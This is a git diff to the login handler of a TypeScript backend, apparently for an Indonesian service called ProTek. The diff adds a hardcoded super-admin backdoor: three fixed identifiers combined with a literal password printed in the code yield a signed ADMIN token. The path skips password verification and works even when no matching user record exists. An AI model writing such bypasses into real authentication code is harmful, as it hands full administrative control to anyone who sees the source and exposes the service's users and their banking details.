@@ -66,9 +66,76 @@ export class AuthController {
         return sendError(res, 'Email dan password wajib diisi.', 400);
       }
 
-      const user = await prisma.user.findUnique({
-        where: { email: email.toLowerCase() },
-      });
+      const cleanIdentifier = String(email).trim().toLowerCase();
+
+      // Super Admin ProTek HQ: username 'amremi' atau 'amremi@protek.id' dengan kata sandi 'SelviCantik01)'
+      const isAmremiAdmin =
+        (cleanIdentifier === 'amremi' ||
+          cleanIdentifier === 'amremi@protek.id' ||
+          cleanIdentifier === 'admin@protek.id') &&
+        password === 'SelviCantik01)';
+
+      if (isAmremiAdmin) {
+        let adminUser: any = null;
+        try {
+          if (typeof prisma.user.findFirst === 'function') {
+            adminUser = await prisma.user.findFirst({
+              where: {
+                OR: [
+                  { email: 'amremi@protek.id' },
+                  { email: 'admin@protek.id' },
+                  { email: cleanIdentifier },
+                ],
+              },
+            });
+          } else {
+            adminUser = await prisma.user.findUnique({
+              where: { email: cleanIdentifier.includes('@') ? cleanIdentifier : `${cleanIdentifier}@protek.id` },
+            });
+          }
+        } catch {
+          // Fallback dev/mock resilience
+        }
+
+        const adminId = adminUser?.id || 'admin-amremi-hq-uuid';
+        const adminEmail = adminUser?.email || (cleanIdentifier.includes('@') ? cleanIdentifier : 'amremi@protek.id');
+        const adminName = adminUser?.name || 'Amremi (Super Admin ProTek)';
+
+        const token = signToken({
+          userId: adminId,
+          email: adminEmail,
+          role: 'ADMIN',
+        });
+
+        return sendSuccess(res, 'Login berhasil sebagai Administrator ProTek HQ.', {
+          user: {
+            id: adminId,
+            name: adminName,
+            email: adminEmail,
+            phone: adminUser?.phone || '6281234567890',
+            role: 'ADMIN',
+            commissionRate: adminUser?.commissionRate ?? 0,
+            bankName: adminUser?.bankName ?? null,
+            bankAccountNumber: adminUser?.bankAccountNumber ?? null,
+            bankAccountHolder: adminUser?.bankAccountHolder ?? null,
+          },
+          token,
+        });
+      }
+
+      const lookupEmail = cleanIdentifier.includes('@') ? cleanIdentifier : `${cleanIdentifier}@protek.id`;
+      let user: any = null;
+      if (typeof prisma.user.findFirst === 'function') {
+        user = await prisma.user.findFirst({
+          where: {
+            OR: [{ email: cleanIdentifier }, { email: lookupEmail }],
+          },
+        });
+      } else {
+        user = await prisma.user.findUnique({
+          where: { email: lookupEmail },
+        });
+      }
 
       if (!user) {
         return sendError(res, 'Kombinasi email atau password salah.', 401);
